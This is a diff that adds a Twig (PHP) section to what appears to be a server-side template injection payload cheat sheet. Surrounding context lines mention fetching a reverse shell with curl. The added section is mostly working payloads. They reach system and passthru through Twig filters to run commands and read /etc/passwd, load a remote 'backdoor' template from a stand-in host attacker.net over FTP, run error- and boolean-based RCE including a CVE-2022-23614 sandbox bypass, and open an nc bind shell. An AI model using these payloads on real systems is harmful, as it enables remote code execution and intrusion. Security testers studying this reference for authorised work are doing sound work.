@@ -46,6 +46,45 @@ Use curl to download the reverse shell from your Python HTTP server:
 
 Start the listener on the attacker machine and execute the script to obtain a reverse shell.
 
+## TWIG(PHP)
+After identification, we can try the following payloads to perform RCE:
+
+```
+{{['id','']|sort('passthru')}}
+{{self}}
+{{_self.env.setCache("ftp://attacker.net:2121")}}{{_self.env.loadTemplate("backdoor")}}
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
+{{['id']|filter('system')}}
+{{[0]|reduce('system','id')}}
+{{['id']|map('system')|join}}
+{{['id',1]|sort('system')|join}}
+{{['cat\x20/etc/passwd']|filter('system')}}
+{{['cat$IFS/etc/passwd']|filter('system')}}
+{{['id']|filter('passthru')}}
+{{['id']|map('passthru')}}
+{{['nslookup oastify.com']|filter('system')}}
+
+{% for a in ["error_reporting", "1"]|sort("ini_set") %}{% endfor %} // Enable verbose error output for Error-Based
+{{_self.env.registerUndefinedFilterCallback("shell_exec")}}{%include ["Y:/A:/", _self.env.getFilter("id")]|join%} // Error-Based RCE <= 1.19
+{{[0]|map(["xx", {"id": "shell_exec"}|map("call_user_func")|join]|join)}} // Error-Based RCE >=1.41, >=2.10, >=3.0
+
+{{_self.env.registerUndefinedFilterCallback("shell_exec")}}{{1/(_self.env.getFilter("id && echo UniqueString")|trim('\n') ends with "UniqueString")}} // Boolean-Based RCE <= 1.19
+{{1/({"id && echo UniqueString":"shell_exec"}|map("call_user_func")|join|trim('\n') ends with "UniqueString")}} // Boolean-Based RCE >=1.41, >=2.10, >=3.0
+{{ 1 / (["id >>/dev/null && echo -n 1", "0"]|sort("system")|first == "0") }} // Boolean-Based RCE with sandbox bypass using CVE-2022-23614
+```
+
+After confirming which payload works, we can get a shell by creating a bind shell:
+
+```
+{{['rm+-f+/tmp/f;+mkfifo+/tmp/f;+cat+/tmp/f+|+/bin/sh+-i+2>&1+|+nc+-l+0.0.0.0+1234+>+/tmp/f','']|sort('passthru')}}
+
+```
+Connect using: 
+```
+nc <target-ip> 1234 
+```
+Note: The shell method should be adjusted based on the target environment, available binaries, and network restrictions.
+
 ## Node.js – Pug (Jade)
 
 Server-Side Template Injection (SSTI) in Pug can be identified by testing JavaScript interpolation.
